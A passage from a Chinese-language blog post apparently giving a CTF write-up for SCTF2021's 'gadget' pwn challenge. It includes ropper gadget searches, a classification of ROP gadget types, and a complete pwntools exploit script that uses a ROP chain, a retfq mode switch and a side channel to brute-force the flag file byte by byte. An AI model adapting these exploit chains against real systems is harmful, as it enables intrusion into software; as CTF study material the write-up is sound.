class="number">0</span>)+p64(pop_rsi_r15_rbp)+p64(push_rsi_ret)+p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    payload+=p64(push_rsi_ret)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    start=time.time()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh.recv()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        end=time.time()</span><br><span class="line">        asc=<span class="built_in">int</span>(end-start)</span><br><span class="line">        <span class="keyword">global</span> flag</span><br><span class="line">        flag+=<span class="built_in">chr</span>(asc)</span><br><span class="line">        <span class="built_in">print</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">         pwn(i)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="运行效果-跑了快一个小时"><a href="#运行效果-跑了快一个小时" class="headerlink" title="运行效果(跑了快一个小时)"></a>运行效果(跑了快一个小时)</h2><p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220119231414100.png" alt="image-20220119231414100"></p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220119231430907.png" alt="image-20220119231430907"></p>
<p>拼接得到flag</p>
<h2 id="工具介绍–ropper"><a href="#工具介绍–ropper" class="headerlink" title="工具介绍–ropper"></a>工具介绍–ropper</h2><p>专门用来找gadget的工具，大部分时间比ROPgadget好用</p>
<p>启动并载入程序</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@ubuntu:~/get-shell/sctf2021/gadget$ ropper</span><br><span class="line"><span class="meta">(ropper)&gt;</span><span class="bash"> file ./gadget</span></span><br><span class="line">[INFO] Load gadgets from cache</span><br><span class="line">[LOAD] loading... 100%</span><br><span class="line">[LOAD] removing double gadgets... 100%</span><br><span class="line">[INFO] File loaded.</span><br></pre></td></tr></table></figure>

<p>搜索的时候可以直接搜自己想要的gadget,也可以使用search+gadget,模糊搜索的时候可以使用？，如下图</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[INFO] Searching for gadgets: pop rdi</span><br><span class="line">[INFO] File: ./gadget</span><br><span class="line">0x0000000000407464: pop rdi; add byte ptr [rax], al; or cl, byte ptr [rdi]; pushfq; ret 0x59be; </span><br><span class="line">0x0000000000402be4: pop rdi; jmp rax; </span><br><span class="line">0x0000000000409db1: pop rdi; mov eax, 0xca; xor esi, esi; xor r10d, r10d; syscall; </span><br><span class="line">0x0000000000401734: pop rdi; pop rbp; ret; </span><br><span class="line"><span class="meta">(gadget/ELF/x86_64)&gt;</span><span class="bash"> search pop r?i</span></span><br><span class="line">[INFO] Searching for gadgets: pop r?i</span><br><span class="line">[INFO] File: ./gadget</span><br><span class="line">0x0000000000407464: pop rdi; add byte ptr [rax], al; or cl, byte ptr [rdi]; pushfq; ret 0x59be; </span><br><span class="line">0x0000000000402be4: pop rdi; jmp rax; </span><br><span class="line">0x0000000000409db1: pop rdi; mov eax, 0xca; xor esi, esi; xor r10d, r10d; syscall; </span><br><span class="line">0x0000000000401734: pop rdi; pop rbp; ret; </span><br><span class="line">0x0000000000407ca5: pop rsi; mov eax, 0xca; mov rdi, r9; syscall; </span><br><span class="line">0x0000000000402be2: pop rsi; pop r15; jmp rax; </span><br><span class="line">0x0000000000401732: pop rsi; pop r15; pop rbp; ret; </span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="寻找gadget"><a href="#寻找gadget" class="headerlink" title="寻找gadget"></a>寻找gadget</h3><p>思路一般大家都能想到，但在不能shellcode的话最重要的就是寻找合适的gadget来构造攻击链了。gadget一般是利用栈进行值的传递然后调用函数，根据这个特性我把gadget分为四类</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">第一类利用pop传值</span><br><span class="line"><span class="meta">(gadget/ELF/x86_64)&gt;</span><span class="bash"> search pop|ret</span></span><br><span class="line">[INFO] Searching for gadgets: pop|ret</span><br><span class="line"></span><br><span class="line">[INFO] File: ./gadget</span><br><span class="line">0x000000000040288d: pop r12; pop r13; pop r14; pop r15; pop rbp; ret; </span><br><span class="line">0x000000000040172f: pop r12; pop r14; pop r15; pop rbp; ret; </span><br><span class="line">0x000000000040288f: pop r13; pop r14; pop r15; pop rbp; ret; </span><br><span class="line">0x0000000000402be1: pop r14; pop r15; jmp rax; </span><br><span class="line"></span><br><span class="line">第二类利用mov传值（这道题就用到了）</span><br><span class="line"><span class="meta">(gadget/ELF/x86_64)&gt;</span><span class="bash"> search mov|ret</span></span><br><span class="line">[INFO] Searching for gadgets: mov|ret</span><br><span class="line"></span><br><span class="line">[INFO] File: ./gadget</span><br><span class="line">0x0000000000404cbb: mov ah, 0x86; add byte ptr [rax], al; or cl, byte ptr [rdi]; pushfq; ret 0x8cbe; </span><br><span class="line">0x000000000040150c: mov ah, 0x8a; push rbp; fdivrp st(6); ret 0xf01; </span><br><span class="line">0x00000000004020f9: mov al, 0x40; add byte ptr [rsi + 0x8002], bh; syscall; </span><br><span class="line">0x000000000040213e: mov al, 0x94; je 0x2151; mov byte ptr [rbx + 0xb2353d], 0; or cl, byte ptr [rdi]; pushfq; ret 0x43bf; </span><br><span class="line"></span><br><span class="line">第三类利用寄存器加call函数调用</span><br><span class="line"><span class="meta">(gadget/ELF/x86_64)&gt;</span><span class="bash"> search call r??</span></span><br><span class="line">[INFO] Searching for gadgets: call r??</span><br><span class="line">[INFO] File: ./gadget</span><br><span class="line">0x0000000000402c0a: call r14; mov edi, eax; call 0x1010; ret; </span><br><span class="line">0x0000000000402c0b: call rsi; </span><br><span class="line">0x0000000000402c0b: call rsi; mov edi, eax; call 0x1010; ret; </span><br><span class="line">第四类系统调用，一般形式是syscall;ret 或者int80;ret</span><br><span class="line">x0000000000401165: syscall; pop rbp; ret; </span><br><span class="line">0x0000000000408865: syscall; ret; </span><br><span class="line"><span class="meta">(gadget/ELF/x86_64)&gt;</span><span class="bash"> search int 0x80</span></span><br><span class="line">[INFO] Searching for gadgets: int 0x80</span><br><span class="line"></span><br><span class="line">[INFO] File: ./gadget</span><br><span class="line">0x00000000004011f3: int 0x80; </span><br><span class="line">0x00000000004011f3: int 0x80; ret; </span><br></pre></td></tr></table></figure>

<p>rop的时候就搜索这四类就好了。</p>
<h2 id="不利用alarm进行侧信道爆破"><a href="#不利用alarm进行侧信道爆破" class="headerlink" title="不利用alarm进行侧信道爆破"></a>不利用alarm进行侧信道爆破</h2><p>在单线程的情况下使用alarm进行侧信道爆破十分之慢，上面我写的那个脚本要跑出全部的flag大概需要快一个小时，尝试跑了一下别人的利用gadget进行爆破速度快多了，所以打算学习一波。</p>
<p>侧信道的精髓就是不同的比较结果会影响程序流，我么可以使用脚本探测程序流的状况，从而达到推测比价结果得到flag。</p>
<p>问了ayoung佬他的gadget，在初期理解上出现了一点问题，我一直没搞懂cmp以后的比较结果到底体现在哪里，动态调试以后才搞懂体现在cmovnz指令上，比如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cmp     rax, [r15+38h]</span><br><span class="line">mov     eax, 0CD2CFCA4h</span><br><span class="line">mov     ecx, 0DF6F8009h</span><br><span class="line">cmovnz  eax, ecx</span><br><span class="line">jmp     loc_409269</span><br></pre></td></tr></table></figure>

<p>当cmp不相等的时候ecx传值给eax，相等的时候不传值，这两个寄存器对后面的程序流有影响，相等的时候程序陷入循环，不相等的时候程序报错退出可以用recv()对程序状态进行检测。</p>
<p>我的脚本是基于我原先脚本修改的（懒），由于改的有点问题，导致我对程序的rop控制出现了问题，多次动态调试才找见文件，哎。浪费了一下午。下面就是缝缝补补的脚本了。速度虽然快了但是成功率不是很高🤦‍♀️，应该跟我频繁的使用red函数有关系</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x000000000040288d : pop r12 ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x000000000040172f : pop r12 ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x000000000040288f : pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401731 : pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401733 : pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401001 : pop rax ; ret</span></span><br><span class="line"><span class="string">0x0000000000402890 : pop rbp ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401102 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x000000000040172e : pop rbx ; pop r12 ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000403072 : pop rbx ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x000000000040117b : pop rcx ; ret</span></span><br><span class="line"><span class="string">0x0000000000401734 : pop rdi ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401732 : pop rsi ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x000000000040288e : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401730 : pop rsp ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401002 : ret</span></span><br><span class="line"><span class="string">0x0000000000402c04: mov rsi, r15; mov rdx, r12; call r14; mov edi, eax; call 0x1010; ret;</span></span><br><span class="line"><span class="string">x0000000000401102: pop rbp; ret;</span></span><br><span class="line"><span class="string">0x0000000000409d1c: pop rsp; mov edi, 0x88bf2838; ret;</span></span><br><span class="line"><span class="string">0x0000000000401001: pop rax; ret; </span></span><br><span class="line"><span class="string">0x00000000004011f3: int 0x80; ret;</span></span><br><span class="line"><span class="string">0x0000000000403072: pop rbx; pop r14; pop r15; pop rbp; ret;</span></span><br><span class="line"><span class="string">0x000000000040117b: pop rcx; ret;</span></span><br><span class="line"><span class="string">0x0000000000408865: syscall; ret;</span></span><br><span class="line"><span class="string">0x0000000000401732: pop rsi; pop r15; pop rbp; ret;</span></span><br><span class="line"><span class="string">0x00000000004011c5 : push rsi ; ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">push_rsi_ret=<span class="number">0x00000000004011c5</span></span><br><span class="line">alarm = <span class="number">0x40115D</span></span><br><span class="line">sys_ret=<span class="number">0x0000000000408865</span></span><br><span class="line">pop_rcx=<span class="number">0x000000000040117b</span></span><br><span class="line">pop_rbx_r14_r15_rbp=<span class="number">0x0000000000403072</span></span><br><span class="line">int80_ret=<span class="number">0x00000000004011f3</span></span><br><span class="line">retfq = <span class="number">0x4011ec</span></span><br><span class="line">bss_base=<span class="number">0x40c000</span>+<span class="number">0x1000</span></span><br><span class="line">pop_rax=<span class="number">0x0000000000401001</span></span><br><span class="line">pop_rdi_rbp=<span class="number">0x0000000000401734</span></span><br><span class="line">pop_rsi_r15_rbp=<span class="number">0x0000000000401732</span></span><br><span class="line">pop_rbp=<span class="number">0x0000000000401102</span></span><br><span class="line">sys_read=<span class="number">0x40119A</span></span><br><span class="line">pop_r12_r14_r15_rbp=<span class="number">0x000000000040172f</span></span><br><span class="line">mov_rsi_rdx_call_r14=<span class="number">0x0000000000402c04</span></span><br><span class="line">pop_rsp_mov_edi=<span class="number">0x0000000000409d1c</span></span><br><span class="line">ret=<span class="number">0x0000000000401002</span></span><br><span class="line">pop_rax=<span class="number">0x0000000000401001</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>(<span class="params">num,ans</span>):</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">str</span>(num)+<span class="string">&quot;==&gt;&quot;</span>+<span class="built_in">chr</span>(ans)</span><br><span class="line">    sh=process(<span class="string">&#x27;./gadget&#x27;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(sh,&quot;b *0x408F72&quot;)</span></span><br><span class="line">    <span class="comment">#part1 stack&amp;read</span></span><br><span class="line">    payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(pop_rax)+p64(<span class="number">0</span>)+p64(pop_rdi_rbp)+p64(<span class="number">0</span>)+p64(bss_base)</span><br><span class="line">    payload+=p64(pop_r12_r14_r15_rbp)+p64(<span class="number">0x300</span>)+p64(sys_read)+p64(bss_base)+p64(bss_base)</span><br><span class="line">    payload+=p64(mov_rsi_rdx_call_r14)+p64(pop_rsp_mov_edi)+p64(bss_base+<span class="number">0x8</span>)</span><br><span class="line">    sh.send(payload.ljust(<span class="number">0xc0</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="comment">#part2 retf&amp;open&amp;read</span></span><br><span class="line">    payload=<span class="string">&#x27;./flag\x00\x00&#x27;</span>+p64(retfq)+p64(ret)+p64(<span class="number">0x23</span>)</span><br><span class="line">    payload+=p32(pop_rax)+p32(<span class="number">5</span>)+p32(pop_rbx_r14_r15_rbp)+p32(bss_base)*<span class="number">4</span></span><br><span class="line">    payload+=p32(pop_rcx)+p32(<span class="number">0</span>)+p32(int80_ret)+p32(retfq)+p32(ret)</span><br><span class="line">    payload+=p32(<span class="number">0x33</span>)+p64(pop_rax)+p64(<span class="number">0</span>)+p64(pop_rdi_rbp)+p64(<span class="number">3</span>)+p64(bss_base)</span><br><span class="line">    payload+=p64(sys_ret)+p64(pop_rdi_rbp)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rsi_r15_rbp)</span><br><span class="line">    payload+=p64(bss_base+<span class="number">1</span>+num)*<span class="number">2</span>+p64(bss_base+<span class="number">8</span>+num)+p64(pop_rax)+p64(<span class="number">0</span>)+p64(sys_ret)+p64(pop_rsp_mov_edi)+p64(bss_base+<span class="number">8</span>+num)</span><br><span class="line">    payload=payload.ljust(<span class="number">0x300</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    <span class="comment">#part3 alarm</span></span><br><span class="line">    payload=<span class="string">&#x27;\x00\x00\x00\x00\x00\x00\x00&#x27;</span>+p64(pop_rsi_r15_rbp)+p64(<span class="number">0</span>)+p64(bss_base-<span class="number">0x38</span>+num)*<span class="number">2</span></span><br><span class="line">    payload+=p64(pop_rax)+p64(ans)+p64(<span class="number">0x408F72</span>)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh.recv(timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">global</span> flag</span><br><span class="line">        flag+=<span class="built_in">chr</span>(ans)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;flag:&quot;</span>+flag</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x22</span>,<span class="number">0x7f</span>):</span><br><span class="line">            s=pwn(i,m)</span><br><span class="line">            <span class="keyword">if</span> s==<span class="number">1</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">rootzhang</p>
  <div class="site-description" itemprop="description">我的博客</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">33</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">rootzhang</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
